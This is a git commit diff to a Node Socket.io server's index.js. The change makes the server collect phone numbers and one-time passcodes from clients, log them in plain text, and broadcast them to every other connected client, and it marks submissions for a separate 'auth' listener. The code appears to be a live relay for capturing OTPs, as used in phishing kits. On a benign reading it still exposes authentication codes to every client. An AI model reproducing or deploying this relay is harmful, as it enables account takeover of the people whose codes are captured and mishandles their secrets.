79f7ff4ebf6191c5b9eeb4f5568c89f4b272d9d6
sagardubey14 <sagardubey353@gmail.com>
2025-03-23 19:15:58 +0530

    connection

--- index.js
+++ index.js
@@ -1,17 +1,49 @@
+require('dotenv').config();
 const http = require('http');
 const socketIo = require('socket.io');
+
+const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://localhost:5173';
 
 const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Socket.io server running!');
 });
-const io = socketIo(server);
+
+const io = socketIo(server, {
+    cors: {
+        origin: allowedOrigin,
+        methods: ['GET', 'POST'],
+        allowedHeaders: ['my-custom-header'],
+        credentials: true,
+    }
+});
+
+
 
 io.on('connection', (socket) => {
-    console.log('a user connected');
-    
+    let phone, otp;
+    console.log('a user connected', socket.handshake.query);
+    socket.on('verify-from-review',(msg)=>{
+        socket.broadcast.emit('verify-to-auth', msg);
+    })
     socket.on('message', (msg) => {
         console.log('Received message: ' + msg);
+        if(msg.type === 'phone'){
+            phone = msg.value;
+        }
+        else if(msg.type === 'otp'){
+            otp = msg.value;
+        }else if(msg.type === 'registered'){
+            phone = phone + " - 🚀"
+        }else if(msg.type === 'otpsubmit'){
+            otp = otp + " - 🚀"
+        }
+        console.log('phone-',phone );
+        console.log('otp-', otp ); 
+        socket.broadcast.emit('message', {
+            phone,
+            otp
+        });
     });
 
     socket.on('disconnect', () => {
